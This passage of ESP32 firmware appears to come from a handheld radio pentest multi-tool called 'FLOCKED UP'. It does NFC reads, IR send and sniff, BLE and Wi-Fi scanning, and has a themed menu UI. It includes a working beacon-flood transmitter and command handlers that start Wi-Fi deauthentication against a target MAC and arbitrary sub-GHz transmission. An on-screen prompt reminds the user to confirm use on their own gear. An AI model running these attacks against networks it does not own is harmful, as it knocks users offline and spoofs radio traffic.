  0x01, 0x08, 0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c
};

void sendBeaconBurst() {
  static uint8_t ch = 1;
  beaconFrame[10] = beaconFrame[16] = 0xBA;
  beaconFrame[15] = beaconFrame[21] = ch;
  for (int i = 0; i < 3; i++) esp_wifi_80211_tx(WIFI_IF_STA, beaconFrame, sizeof(beaconFrame), false);
  if (++ch > 11) ch = 1;
}

// ===========================================================================
// NFC (PN532) and IR
// ===========================================================================
void nfcPoll() {
  if (!nfcok) { notifyLine("DATA:ERR:nfc,absent\n"); return; }
  uint8_t uid[7] = {0}; uint8_t uidLen = 0;
  if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 150)) {
    const char *kind = (uidLen == 4) ? "MifareClassic" : (uidLen == 7) ? "MifareUL/NTAG" : "ISO14443A";
    notifyLine("DATA:NFC:" + hex2(uid, uidLen) + "," + String(kind) + "\n");
  } else {
    notifyLine("DATA:NFC:,none\n");
  }
}

void irSend(const String &params) {
  // CMD:irsend:<protocol>,<hex>[,<bits>]   protocol: NEC|SONY|RC5|SAMSUNG|RAW
  int c1 = params.indexOf(',');
  String proto = (c1 < 0) ? params : params.substring(0, c1);
  String rest  = (c1 < 0) ? "" : params.substring(c1 + 1);
  int c2 = rest.indexOf(',');
  String hexv  = (c2 < 0) ? rest : rest.substring(0, c2);
  int bits = (c2 < 0) ? 32 : rest.substring(c2 + 1).toInt();
  uint64_t val = strtoull(hexv.c_str(), nullptr, 16);
  proto.toUpperCase();
  if (proto == "NEC")        irsend.sendNEC(val, bits);
  else if (proto == "SONY")  irsend.sendSony(val, bits ? bits : 12);
  else if (proto == "SAMSUNG") irsend.sendSAMSUNG(val, bits);
  else if (proto == "RC5")   irsend.sendRC5(val, bits ? bits : 13);
  else { notifyLine("DATA:ERR:ir,proto\n"); return; }
  notifyLine("DATA:IRTX:" + proto + "," + hexv + ",ok\n");
}

void irRxPump() {
  decode_results res;
  if (irrecv.decode(&res)) {
    notifyLine("DATA:IR:" + String(typeToString(res.decode_type)) + "," +
               String(res.bits) + "," + uint64ToString(res.value, 16) + "\n");
    irrecv.resume();
  }
}

// ===========================================================================
// Command handling (BLE + serial)
// ===========================================================================
void parseMac(const String &s, uint8_t *mac) {
  int v[6] = {0};
  if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) == 6)
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)v[i];
}

// BLE device discovery -> DATA:BLE (a Bluetooth feed for the app / Scavenge menu).
// A short blocking pass; results are emitted in loop() context (BLE-safe).
void runBleScanPass() {
  if (!pBLEScan) { bleScanRun = false; return; }
  BLEScanResults *res = pBLEScan->start(2, false);
  int n = res ? res->getCount() : 0;
  for (int i = 0; i < n && hostUp() && bleScanRun; i++) {
    BLEAdvertisedDevice d = res->getDevice(i);
    String name = d.haveName() ? d.getName() : String("");
    name.replace(",", " "); name.replace("\n", " ");
    // DATA:BT:<label>,<id/mac>,<rssi> — matches the app's wardrive BT ingestion,
    // so node BLE devices flow into the Bluetooth panel, radar and map like any board.
    notifyLine("DATA:BT:" + name + "," + d.getAddress().toString() + "," + String(d.getRSSI()) + "\n");
  }
  pBLEScan->clearResults();
}

void stopAll() {
  scanning = false; subScan = false;
  deauthRun = false; beaconRun = false;
  bleScanRun = false; anaRun = false;
  stopSniffer();
  setStatus("idle");
  setLed(0, 0, 8);
}

void handleCommand(String v) {
  v.trim();
  if (!v.startsWith("CMD:")) return;

  // ---- link-code pairing gate (runs before any other command) --------------
  if (v.startsWith("CMD:link:")) {
    String code = v.substring(9); code.trim();
    if (linked) { notifyLine("DATA:LINK:ok\n"); return; }
    if (linkBackoffUntil && millis() < linkBackoffUntil) { notifyLine("DATA:LINK:bad\n"); return; }
    char want[8]; sprintf(want, "%06u", linkCode);
    if (code == want) {
      linked = true; linkNeedPending = false; linkBadTries = 0; linkBackoffUntil = 0;
      notifyLine("DATA:LINK:ok\n");
      setStatus(op.c_str());
      fuDirty = true;
    } else {
      if (++linkBadTries >= 5) { linkBackoffUntil = millis() + 5000; linkBadTries = 0; }  // short backoff
      notifyLine("DATA:LINK:bad\n");
    }
    return;
  }
  // Locked: ignore every other CMD until linked, and (re)prompt the central.
  if (!linked) { linkNeedPending = false; notifyLine("DATA:LINK:need\n"); return; }

  if (v.startsWith("CMD:stopscan"))      { stopAll(); notifyLine("DATA:MODE:idle,stop\n"); return; }
  if (v.startsWith("CMD:launcher") || v.startsWith("CMD:reboot")) {
    // Soft path: reboot. Reliable return to the Launcher needs GPIO6 held at boot,
    // so prompt the user; the hardware long-press of USER_KEY is the guaranteed way.
    notifyLine("DATA:MODE:launcher,reboot\n");
    delay(60); returnToLauncher(); return;
  }
  if (v.startsWith("CMD:scanall"))       { subScan = true; setStatus("subghz"); setLed(8,4,0); notifyLine("DATA:MODE:subghz,start\n"); return; }
  if (v.startsWith("CMD:tx:")) {
    String p = v.substring(7); int comma = p.indexOf(',');
    if (comma > 0) { txFreq = p.substring(0, comma).toFloat(); txBits = p.substring(comma + 1); txBits.trim();
      if (txFreq > 250 && txFreq < 960 && txBits.length() > 0) txPending = true; }
    return;
  }
  if (v.startsWith("CMD:stationlist") || v.startsWith("CMD:sniffsta")) { scanning=false; startSniffer('S'); setStatus("stations"); notifyLine("DATA:MODE:stations,start\n"); return; }
  if (v.startsWith("CMD:probesniff"))   { scanning=false; startSniffer('P'); setStatus("probes");   notifyLine("DATA:MODE:probes,start\n"); return; }
  if (v.startsWith("CMD:pktmon") || v.startsWith("CMD:monitor")) { scanning=false; startSniffer('M'); setStatus("pktmon"); notifyLine("DATA:MODE:pktmon,start\n"); return; }
  if (v.startsWith("CMD:deauth")) {
    haveDeauthTarget = false;
    int c = v.indexOf(':', 4);
    if (c > 0) { String t = v.substring(c + 1); t.trim(); if (t.length() >= 11) { parseMac(t, deauthTarget); haveDeauthTarget = true; } }
    scanning = false; deauthRun = true; setStatus("deauth"); setLed(12,0,0); notifyLine("DATA:ATK:deauth,start\n"); return;
  }
  if (v.startsWith("CMD:beaconspam") || v.startsWith("CMD:beacon")) { scanning=false; beaconRun = true; setStatus("beaconspam"); setLed(12,0,12); notifyLine("DATA:ATK:beacon,start\n"); return; }
  if (v.startsWith("CMD:nfcread") || v.startsWith("CMD:nfc"))   { nfcPoll(); return; }
  if (v.startsWith("CMD:irsend:"))      { irSend(v.substring(11)); return; }
  if (v.startsWith("CMD:irsniff"))      { irRxOn = true; irrecv.enableIRIn(); notifyLine("DATA:MODE:irsniff,start\n"); return; }
  if (v.startsWith("CMD:blescan") || v.startsWith("CMD:btscan") || v.startsWith("CMD:sniffbt")) { bleScanRun = true; setStatus("ble"); setLed(0,0,12); notifyLine("DATA:MODE:bt,start\n"); return; }

  // Generic wardrive sweep (main DATA:AP feed).
  if (v.startsWith("CMD:scan") || v.startsWith("CMD:sniff") || v.startsWith("CMD:aplist")) {
    subScan=false; stopSniffer(); scanning = true; setStatus("wardrive"); setLed(0,10,0); return;
  }
  notifyLine("DATA:ERR:unknown," + v + "\n");
}

class CmdCallbacks : public BLECharacteristicCallbacks {
  void onWrite(BLECharacteristic *c) override { handleCommand(c->getValue().c_str()); }
};

class SrvCallbacks : public BLEServerCallbacks {
  void onConnect(BLEServer *s) override {
    connected = true;
    linked = false; linkNeedPending = true; linkNeedAt = millis() + 400;  // lock this session
    setLed(16, 8, 0);                     // amber = connected but not linked
    fuDirty = true;
  }
  void onDisconnect(BLEServer *s) override {
    connected = false; linked = false; stopAll();   // relock; code persists until reboot/regen
    fuDirty = true;
    if (cfg.appLink) BLEDevice::startAdvertising();
  }
};

void pollSerialCommands() {
  static String sbuf;
  while (Serial.available()) {
    char ch = (char)Serial.read();
    if (ch == '\n' || ch == '\r') {
      if (sbuf.length()) { String l = sbuf; sbuf = ""; l.trim(); if (l.startsWith("CMD:")) { serialActive = true; handleCommand(l); } }
    } else if (sbuf.length() < 160) sbuf += ch; else sbuf = "";
  }
}

// ===========================================================================
// setup / loop
// ===========================================================================
// ===========================================================================
// FLOCKED UP — crow UI (input, theme, mascot, screens, SD browser, settings)
// ===========================================================================
int8_t fuEnc() {
  static const int8_t TAB[16] = {0,-1,1,0, 1,0,0,-1, -1,0,0,1, 0,1,-1,0};
  static uint8_t prev = 0; static int8_t acc = 0;
  uint8_t cur = (digitalRead(ENC_A) << 1) | digitalRead(ENC_B);
  acc += TAB[(prev << 2) | cur];
  prev = cur;
  if (acc >= 4)  { acc = 0; return +1; }
  if (acc <= -4) { acc = 0; return -1; }
  return 0;
}

bool fuSelectPressed() {           // ENC_KEY, debounced press edge
  static uint32_t last = 0; static bool down = false;
  bool now = digitalRead(ENC_KEY) == LOW;
  if (now && !down && millis() - last > 160) { down = true; last = millis(); return true; }
  if (!now) down = false;
  return false;
}

void applyLed() { setLed(LED_PAL[cfg.led][0], LED_PAL[cfg.led][1], LED_PAL[cfg.led][2]); }

void loadCfg() {
  prefs.begin("flocked", true);
  cfg.puns    = prefs.getBool("puns", true);
  cfg.bright  = prefs.getUChar("bright", 40);
  cfg.led     = prefs.getUChar("led", 0);
  cfg.mascot  = prefs.getUChar("mascot", 0);
  cfg.appLink = prefs.getBool("applink", true);
  cfg.rot      = prefs.getUChar("rot", 1);
  cfg.sleepMin = prefs.getUChar("sleepmin", 0);
  prefs.end();
  if (cfg.bright < 20) cfg.bright = 20;
  if (cfg.led >= LED_PAL_N) cfg.led = 0;
  if (cfg.mascot > 3) cfg.mascot = 0;
  if (cfg.rot != 1 && cfg.rot != 3) cfg.rot = 1;
}
void saveCfg() {
  prefs.begin("flocked", false);
  prefs.putBool("puns", cfg.puns);
  prefs.putUChar("bright", cfg.bright);
  prefs.putUChar("led", cfg.led);
  prefs.putUChar("mascot", cfg.mascot);
  prefs.putBool("applink", cfg.appLink);
  prefs.putUChar("rot", cfg.rot);
  prefs.putUChar("sleepmin", cfg.sleepMin);
  prefs.end();
}

// --- crow mascot: embedded pixel sprite drawn in purple, centered at (cx,cy) --
static uint16_t crowBuf[120 * 100];
void drawCrow(int cx, int cy, uint8_t mood) {
  const uint8_t *bmp; int w, h;
  switch (mood) {
    case 1:  bmp = CROW_SCAN; w = CROW_SCAN_W; h = CROW_SCAN_H; break;
    case 2:  bmp = CROW_HIT;  w = CROW_HIT_W;  h = CROW_HIT_H;  break;
    case 3:  bmp = CROW_FLIP; w = CROW_FLIP_W; h = CROW_FLIP_H; break;
    default: bmp = CROW_IDLE; w = CROW_IDLE_W; h = CROW_IDLE_H; break;
  }
  // Expand the 1-bit mask to RGB565 and blit the whole block in one windowed
  // transaction (drawRGBBitmap) — far faster than per-pixel drawBitmap.
  if (w > 120 || h > 100) { tft.drawBitmap(cx - w / 2, cy - h / 2, bmp, w, h, C_PLUM); return; }
  int rb = (w + 7) / 8;
  for (int y = 0; y < h; y++)
    for (int x = 0; x < w; x++)
      crowBuf[y * w + x] = (pgm_read_byte(&bmp[y * rb + x / 8]) & (0x80 >> (x % 8))) ? C_PLUM : C_BG;
  tft.drawRGBBitmap(cx - w / 2, cy - h / 2, crowBuf, w, h);
}

void fuHeader(const char* title) {
  tft.fillRect(0, 0, 320, 16, C_PANEL);
  tft.setTextSize(1);
  tft.setTextColor(C_BLOOD); tft.setCursor(6, 4);   tft.print("FLOCKED UP");
  tft.setTextColor(C_DIM);   tft.setCursor(182, 4); tft.print(title);
  tft.fillCircle(312, 8, 3, connected ? (linked ? C_AMBER : C_BLOOD) : C_DIM);  // app-link dot
}

void fuDrawList(const char* title, const char* const* plain, const char* const* pun, int n, int sel) {
  if (fuFull) { tft.fillScreen(C_BG); fuHeader(title); drawCrow(58, 92, fuMood); }
  else        { tft.fillRect(112, 18, 208, 152, C_BG); }
  int x = 120, y = 20;
  for (int i = 0; i < n; i++) {
    const char* lbl = (cfg.puns && pun) ? pun[i] : plain[i];
    if (i == sel) { tft.fillRoundRect(x-6, y-2, 200, 14, 3, C_PANEL); tft.drawRoundRect(x-6, y-2, 200, 14, 3, C_BLOOD); }
    tft.setTextColor(i == sel ? C_INK : C_DIM); tft.setTextSize(1); tft.setCursor(x, y); tft.print(lbl);
    y += 16;
  }
}

void fuDrawAction() {
  tft.fillScreen(C_BG);
  fuHeader(fuActionTitle.c_str());
  drawCrow(58, 70, fuMood);
  tft.setTextColor(C_AMBER); tft.setTextSize(1); tft.setCursor(8, 150); tft.print("hold back = stop");
  int x = 120, y = 22;
  for (int i = 0; i < fuLogN; i++) {
    tft.setTextColor(i == 0 ? C_INK : C_DIM); tft.setCursor(x, y);
    String s = fuLog[i]; if (s.length() > 33) s = s.substring(0, 33);
    tft.print(s); y += 16;
  }
  if (fuLogN == 0) { tft.setTextColor(C_DIM); tft.setCursor(x, y); tft.print("listening..."); }
}

// Fast action-screen refresh: repaint only the live log (keeps the crow/header).
void fuDrawActionLog() {
  tft.fillRect(112, 18, 208, 128, C_BG);
  int x = 120, y = 22;
  for (int i = 0; i < fuLogN; i++) {
    tft.setTextColor(i == 0 ? C_INK : C_DIM); tft.setCursor(x, y);
    String s = fuLog[i]; if (s.length() > 33) s = s.substring(0, 33);
    tft.print(s); y += 16;
  }
  if (fuLogN == 0) { tft.setTextColor(C_DIM); tft.setCursor(x, y); tft.print("listening..."); }
}

void fuDrawConfirm() {
  tft.fillScreen(C_BG); fuHeader("Authorize");
  drawCrow(58, 92, 3);
  tft.setTextColor(C_AMBER); tft.setTextSize(1);
  tft.setCursor(120, 34); tft.print("Your OWN gear only.");
  tft.setCursor(120, 50); tft.print("This TRANSMITS.");
  tft.setTextColor(C_INK); tft.setCursor(120, 82); tft.print("Press = I confirm");
  tft.setTextColor(C_DIM); tft.setCursor(120, 100); tft.print("Back = cancel");
}

void fuDrawSettings(int sel) {
  if (fuFull) { tft.fillScreen(C_BG); fuHeader("Settings"); drawCrow(58, 92, fuMood); }
  else        { tft.fillRect(112, 18, 208, 152, C_BG); }
  char buf[SETTINGS_N][32];
  snprintf(buf[0], 32, "Crow puns: %s", cfg.puns ? "ON" : "off");
  snprintf(buf[1], 32, "LED colour: %s", LED_NAME[cfg.led]);
  snprintf(buf[2], 32, "LED bright: %d", cfg.bright);
  snprintf(buf[3], 32, "Mascot: %d", cfg.mascot);
  snprintf(buf[4], 32, "Flip screen: %s", cfg.rot == 3 ? "ON" : "off");
  if (cfg.sleepMin == 0) snprintf(buf[5], 32, "Sleep: off");
  else                   snprintf(buf[5], 32, "Sleep: %um", cfg.sleepMin);
  snprintf(buf[6], 32, "App link: %s", cfg.appLink ? "ON" : "off");
  snprintf(buf[7], 32, "Regen link code");
  snprintf(buf[8], 32, "Return to Launcher");
  snprintf(buf[9], 32, "Save & back");
  int x = 118, y = 20;
  for (int i = 0; i < SETTINGS_N; i++) {
    if (i == sel) { tft.fillRoundRect(x-6, y-2, 204, 13, 3, C_PANEL); tft.drawRoundRect(x-6, y-2, 204, 13, 3, C_BLOOD); }
    tft.setTextColor(i == sel ? C_INK : C_DIM); tft.setTextSize(1); tft.setCursor(x, y); tft.print(buf[i]);
    y += 14;
  }
}

void fuDrawAbout() {
  tft.fillScreen(C_BG); fuHeader("About");
  drawCrow(58, 92, 3);
  tft.setTextSize(2); tft.setTextColor(C_BLOOD); tft.setCursor(116, 26); tft.print("FLOCKED UP");
  tft.setTextSize(1);
  tft.setTextColor(C_INK);   tft.setCursor(118, 52); tft.print("a murder of crows");
  tft.setTextColor(C_AMBER); tft.setCursor(118, 68); tft.print("FTM  \xB7  v0.6");
  tft.setTextColor(C_DIM);   tft.setCursor(118, 90); tft.print("T-Embed CC1101 Plus");
  tft.setCursor(118, 104); tft.print("Flying Flocks fleet");
  char cc[8]; sprintf(cc, "%06u", linkCode);
  tft.setCursor(118, 126); tft.print("link "); tft.print(cc);
}

void nestLoad(const String &path) {
  nestPath = path; nestN = 0; nestSel = 0; nestTop = 0;
  if (!sdok) return;
  File dir = SD.open(path);
  if (!dir || !dir.isDirectory()) { if (dir) dir.close(); return; }
  File f = dir.openNextFile();
  while (f && nestN < NEST_MAX) {
    String nm = f.name(); int sl = nm.lastIndexOf('/'); if (sl >= 0) nm = nm.substring(sl + 1);
    if (nm.length() && nm[0] != '.') { nestNames[nestN] = nm; nestIsDir[nestN] = f.isDirectory(); nestN++; }
    f.close(); f = dir.openNextFile();
  }
  dir.close();
}

void fuDrawNest() {
  if (fuFull) {
    tft.fillScreen(C_BG); fuHeader("The Nest");
    if (sdok) {
      tft.setTextColor(C_DIM); tft.setTextSize(1); tft.setCursor(6, 20);
      String p = nestPath; if (p.length() > 44) p = p.substring(p.length() - 44); tft.print(p);
    }
  } else { tft.fillRect(0, 34, 320, 134, C_BG); }
  if (!sdok) { tft.setTextColor(C_BLOOD); tft.setTextSize(2); tft.setCursor(60, 76); tft.print("No SD card"); return; }
  int rows = 7, x = 6, y = 38;
  if (nestSel < nestTop) nestTop = nestSel;
  if (nestSel >= nestTop + rows) nestTop = nestSel - rows + 1;
  if (nestN == 0) { tft.setCursor(6, 44); tft.print("(empty)"); return; }
  for (int i = nestTop; i < nestN && i < nestTop + rows; i++) {
    if (i == nestSel) { tft.fillRoundRect(x-2, y-2, 308, 16, 3, C_PANEL); tft.drawRoundRect(x-2, y-2, 308, 16, 3, C_BLOOD); }
    tft.setTextColor(nestIsDir[i] ? C_AMBER : (i == nestSel ? C_INK : C_DIM));
    tft.setCursor(x, y);
    String nm = nestNames[i]; if (nm.length() > 48) nm = nm.substring(0, 48);
    tft.print(nestIsDir[i] ? ("[" + nm + "]") : nm);
    y += 17;
  }
}

void fuDrawFile() {
  tft.fillScreen(C_BG); fuHeader("File");
  String nm = fuFilePath; int sl = nm.lastIndexOf('/'); if (sl >= 0) nm = nm.substring(sl + 1);
  tft.setTextColor(C_AMBER); tft.setTextSize(1); tft.setCursor(6, 20); tft.print(nm);
  File f = SD.open(fuFilePath);
  int y = 40;
  if (f) {
    for (int i = 0; i < 7 && f.available(); i++) {
      String ln = f.readStringUntil('\n'); ln.trim();
      if (ln.length() > 52) ln = ln.substring(0, 52);
      tft.setTextColor(C_DIM); tft.setCursor(6, y); tft.print(ln); y += 16;
    }
    f.close();
  }
  tft.setTextColor(C_DIM); tft.setCursor(6, 152); tft.print("back = return");
}

void fuStartAction(FUScreen from, int idx) {
  for (int i = 0; i < FU_LOGN; i++) fuLog[i] = ""; fuLogN = 0;
  uiActionActive = true; localActive = true; nfcPolling = false; fuMood = 1;
  if (from == S_SUB) {
    if (idx == 2) { fuActionTitle = "Analyzer"; anaRun = true; setStatus("analyze"); }
    else { fuActionTitle = (idx == 0) ? "Sub-GHz decode" : "RSSI sweep"; subScan = true; setStatus("subghz"); setLed(8, 4, 0); }
  } else if (from == S_NFC) {
    fuActionTitle = "NFC read"; nfcPolling = true; setStatus("nfc"); setLed(0, 8, 8);
  } else if (from == S_IR) {
    fuActionTitle = "IR sniff"; irRxOn = true; irrecv.enableIRIn(); setStatus("irsniff"); setLed(10, 0, 10);
  } else if (from == S_WIFI) {
    switch (idx) {
      case 0: fuActionTitle = "AP scan";     scanning = true; setStatus("wardrive");  setLed(0, 10, 0); break;
      case 1: fuActionTitle = "Stations";    startSniffer('S'); setStatus("stations"); setLed(0, 8, 4); break;
      case 2: fuActionTitle = "Probes";      startSniffer('P'); setStatus("probes");   setLed(0, 8, 4); break;
      case 3: fuActionTitle = "Pkt monitor"; startSniffer('M'); setStatus("pktmon");   setLed(0, 6, 8); break;
      case 4: fuActionTitle = "Deauth";      deauthRun = true; setStatus("deauth");    setLed(12, 0, 0); fuMood = 3; break;
      case 5: fuActionTitle = "Beacon spam"; beaconRun = true; setStatus("beaconspam");setLed(12, 0, 12); fuMood = 3; break;
    }
  } else if (from == S_BLE) {
    fuActionTitle = "BLE scan"; bleScanRun = true; setStatus("ble"); setLed(0, 0, 12);
  }
  fuScr = S_ACTION; fuDirty = true;
}

void fuStopAction() {
  stopAll(); irRxOn = false; nfcPolling = false;
  uiActionActive = false; localActive = false;
  fuMood = cfg.mascot; applyLed();
}

void fuEnter(FUScreen s) { fuScr = s; fuSel = 0; fuDirty = true; }

void fuSettingsSelect(int i) {
  switch (i) {
    case 0: cfg.puns = !cfg.puns; break;
    case 1: cfg.led = (cfg.led + 1) % LED_PAL_N; applyLed(); break;
    case 2: cfg.bright += 20; if (cfg.bright > 100) cfg.bright = 20; leds.setBrightness(cfg.bright); applyLed(); break;
    case 3: cfg.mascot = (cfg.mascot + 1) % 4; fuMood = cfg.mascot; break;
    case 4: cfg.rot = (cfg.rot == 1) ? 3 : 1; tft.setRotation(cfg.rot); break;
    case 5: { int k = 0; while (k < SLEEP_OPTS_N && SLEEP_OPTS[k] != cfg.sleepMin) k++;
              cfg.sleepMin = SLEEP_OPTS[(k + 1) % SLEEP_OPTS_N]; break; }
    case 6: cfg.appLink = !cfg.appLink; if (cfg.appLink) BLEDevice::startAdvertising(); else BLEDevice::stopAdvertising(); break;
    case 7: genLinkCode(); linked = false; break;
    case 8: saveCfg(); returnToLauncher(); return;
    case 9: saveCfg(); fuEnter(S_MAIN); return;
  }
  fuDirty = true;
}

void fuNestSelect() {
  if (!sdok || !nestN) return;
  String base = nestPath; if (!base.endsWith("/")) base += "/";
  if (nestIsDir[nestSel]) { nestLoad(base + nestNames[nestSel]); fuDirty = true; }
  else { fuFilePath = base + nestNames[nestSel]; fuScr = S_FILE; fuDirty = true; }
}

void fuBack() {
  if (fuScr == S_ACTION) { fuStopAction(); fuScr = fuActionParent; fuDirty = true; return; }
  if (fuScr == S_FILE)   { fuScr = S_NEST; fuDirty = true; return; }
  if (fuScr == S_NEST && nestPath != nestFloor) {
    int sl = nestPath.lastIndexOf('/'); String up = (sl <= 0) ? "/" : nestPath.substring(0, sl);
    if (up.length() < nestFloor.length()) up = nestFloor;
    nestLoad(up); fuDirty = true; return;
  }
  if (fuScr == S_CONFIRM) { fuScr = S_WIFI; fuDirty = true; return; }
  if (fuScr == S_MAIN) return;
  fuScr = S_MAIN; fuSel = 0; fuDirty = true;
}

void fuBootSplash() {
  tft.fillScreen(C_BG);
  tft.drawBitmap((320 - CROW_LOGO_W) / 2, 36, CROW_LOGO, CROW_LOGO_W, CROW_LOGO_H, C_PLUM);
  tft.setTextSize(1); tft.setTextColor(C_AMBER);
  tft.setCursor(92, 36 + CROW_LOGO_H + 16); tft.print("a murder of crows  \xB7  FTM");
  for (int k = 0; k < 3; k++) { setLed(12, 0, 16); delay(110); setLed(0, 0, 0); delay(80); }
  applyLed();
  delay(700);
}

void drawSleep() {
  tft.fillScreen(C_BG);
  tft.drawBitmap((320 - CROW_SLEEP_W) / 2, 28, CROW_SLEEP, CROW_SLEEP_W, CROW_SLEEP_H, C_PLUM);
  tft.setTextColor(C_AMBER); tft.setTextSize(1);
  tft.setCursor(92, 138); tft.print("resting  \xB7  press to wake");
}

void enterSleep() {
  drawSleep();
  setLed(4, 0, 6); delay(500); setLed(0, 0, 0);
  digitalWrite(TFT_BL, LOW);                               // backlight off
  while (digitalRead(USER_KEY) == LOW) delay(10);          // wait for the button release
  delay(60);
  gpio_hold_en((gpio_num_t)BOARD_PWR_EN);                  // keep the board powered through deep sleep
  gpio_deep_sleep_hold_en();
  esp_sleep_enable_ext0_wakeup((gpio_num_t)USER_KEY, 0);   // wake when USER_KEY is pulled LOW
  esp_deep_sleep_start();                                  // resets on wake -> fresh boot
}

void fuRender() {
  fuFull = true;
  switch (fuScr) {
    case S_MAIN:  fuDrawList("menu",    MAIN_PLAIN, MAIN_PUN, MAIN_N, fuSel); break;
    case S_SUB:   fuDrawList("Sub-GHz", SUB_ITEMS,  nullptr,  SUB_N,  fuSel); break;
    case S_WIFI:  fuDrawList("Wi-Fi",   WIFI_ITEMS, nullptr,  WIFI_N, fuSel); break;
    case S_NFC:   { const char* it[] = {"Read tag"};      fuDrawList("NFC",      it, nullptr, 1, fuSel); } break;
    case S_IR:    { const char* it[] = {"Sniff / learn"}; fuDrawList("Infrared", it, nullptr, 1, fuSel); } break;
    case S_BLE:   { const char* it[] = {"Scan devices"};  fuDrawList("Bluetooth", it, nullptr, 1, fuSel); } break;
    case S_SET:   fuDrawSettings(fuSel); break;
    case S_ABOUT: fuDrawAbout(); break;
    case S_NEST:  fuDrawNest(); break;
    case S_FILE:  fuDrawFile(); break;
    case S_ACTION:  fuDrawAction(); break;
    case S_CONFIRM: fuDrawConfirm(); break;
    default: break;
  }
}

void fuRenderRows() {
  fuFull = false;
  switch (fuScr) {
    case S_MAIN:  fuDrawList("menu",    MAIN_PLAIN, MAIN_PUN, MAIN_N, fuSel); break;
    case S_SUB:   fuDrawList("Sub-GHz", SUB_ITEMS,  nullptr,  SUB_N,  fuSel); break;
    case S_WIFI:  fuDrawList("Wi-Fi",   WIFI_ITEMS, nullptr,  WIFI_N, fuSel); break;
    case S_SET:   fuDrawSettings(fuSel); break;
    case S_NEST:  fuDrawNest(); break;
    default: break;
  }
}

void fuHandleInput() {
  int8_t d = fuEnc();
  if (d != 0) {
    fuLastInput = millis();
    switch (fuScr) {
      case S_MAIN: fuSel = (fuSel + d + MAIN_N) % MAIN_N; fuRowsDirty = true; break;
      case S_SUB:  fuSel = (fuSel + d + SUB_N) % SUB_N;   fuRowsDirty = true; break;
      case S_WIFI: fuSel = (fuSel + d + WIFI_N) % WIFI_N; fuRowsDirty = true; break;
      case S_SET:  fuSel = (fuSel + d + SETTINGS_N) % SETTINGS_N; fuRowsDirty = true; break;
      case S_NEST: if (nestN) { nestSel = (nestSel + d + nestN) % nestN; fuRowsDirty = true; } break;
      default: break;
    }
  }
  if (fuSelectPressed()) {
    fuLastInput = millis();
    switch (fuScr) {
      case S_MAIN:
        if (MAIN_GOTO[fuSel] == S_NEST) { nestFloor = "/"; fuScr = S_NEST; nestLoad("/"); fuSel = 0; fuDirty = true; }
        else if (MAIN_GOTO[fuSel] == S_COLL) { SD.mkdir("/flockedup"); SD.mkdir(COLL_ROOT); nestFloor = COLL_ROOT; fuScr = S_NEST; nestLoad(COLL_ROOT); fuSel = 0; fuDirty = true; }
        else fuEnter(MAIN_GOTO[fuSel]);
        break;
      case S_SUB:  fuActionParent = S_SUB; fuStartAction(S_SUB, fuSel); break;
      case S_NFC:  fuActionParent = S_NFC; fuStartAction(S_NFC, 0); break;
      case S_IR:   fuActionParent = S_IR;  fuStartAction(S_IR, 0); break;
      case S_BLE:  fuActionParent = S_BLE; fuStartAction(S_BLE, 0); break;
      case S_WIFI:
        if (fuSel >= 4) { fuPendingAction = fuSel; fuEnter(S_CONFIRM); }
        else { fuActionParent = S_WIFI; fuStartAction(S_WIFI, fuSel); }
        break;
      case S_CONFIRM: fuActionParent = S_WIFI; fuStartAction(S_WIFI, fuPendingAction); break;
      case S_SET:  fuSettingsSelect(fuSel); break;
      case S_NEST: fuNestSelect(); break;
      case S_FILE: fuScr = S_NEST; fuDirty = true; break;
      default: break;
    }
  }
}

void setup() {
  Serial.begin(115200);
  delay(600);
  loadCfg();

  pinMode(BOARD_PWR_EN, OUTPUT); digitalWrite(BOARD_PWR_EN, HIGH);  // keep board powered
  gpio_hold_dis((gpio_num_t)BOARD_PWR_EN);                          // release any deep-sleep pin hold
  pinMode(RF_SW0, OUTPUT); pinMode(RF_SW1, OUTPUT);
  pinMode(ENC_A, INPUT_PULLUP); pinMode(ENC_B, INPUT_PULLUP);
  pinMode(ENC_KEY, INPUT_PULLUP); pinMode(USER_KEY, INPUT_PULLUP);
  pinMode(CC1101_GDO0, INPUT);

  genLinkCode();   // fresh 6-digit link code for this boot

  leds.begin(); leds.setBrightness(cfg.bright); setLed(0, 0, 8);

  SPI.begin(PIN_SPI_SCK, PIN_SPI_MISO, PIN_SPI_MOSI, -1);
  pinMode(TFT_BL, OUTPUT); digitalWrite(TFT_BL, HIGH);
  tft.init(170, 320);
  tft.setRotation(cfg.rot);        // landscape 320x170 (1 normal / 3 flipped)
  tft.setSPISpeed(80000000);       // 80 MHz display clock — fast redraws
  sdok = SD.begin(SD_CS, SPI, 10000000);
  Serial.println(sdok ? "[sd] mounted." : "[sd] no card.");
  fuBootSplash();

  Wire.begin(I2C_SDA, I2C_SCL);
  nfc.begin();
  uint32_t ver = nfc.getFirmwareVersion();
  nfcok = (ver != 0);
  if (nfcok) nfc.SAMConfig();

  cc1101ok = initCC1101();
  Serial.println(cc1101ok ? "[sub] CC1101 detected." : "[sub] CC1101 not detected.");

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true);
  esp_wifi_set_promiscuous(false);

  BLEDevice::init(DEV_NAME);
  BLEDevice::setMTU(517);
  BLEServer *server = BLEDevice::createServer();
  server->setCallbacks(new SrvCallbacks());
  BLEService *svc = server->createService(SVC_UUID);

  BLECharacteristic *cmd = svc->createCharacteristic(
      CMD_UUID, BLECharacteristic::PROPERTY_WRITE | BLECharacteristic::PROPERTY_WRITE_NR);
  cmd->setCallbacks(new CmdCallbacks());

  respChar = svc->createCharacteristic(RESP_UUID, BLECharacteristic::PROPERTY_NOTIFY);
  respChar->addDescriptor(new BLE2902());

  statChar = svc->createCharacteristic(STAT_UUID, BLECharacteristic::PROPERTY_READ);
  setStatus("idle");

  svc->start();
  BLEAdvertising *adv = BLEDevice::getAdvertising();
  adv->addServiceUUID(SVC_UUID);
  adv->setScanResponse(true);
  if (cfg.appLink) BLEDevice::startAdvertising();

  pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);

  fuMood = cfg.mascot; fuScr = S_MAIN; fuDirty = true; fuLastInput = millis();
  Serial.println("[ble] advertising as \"" DEV_NAME "\" (service 4fafc201).");
}

void loop() {
  pollSerialCommands();

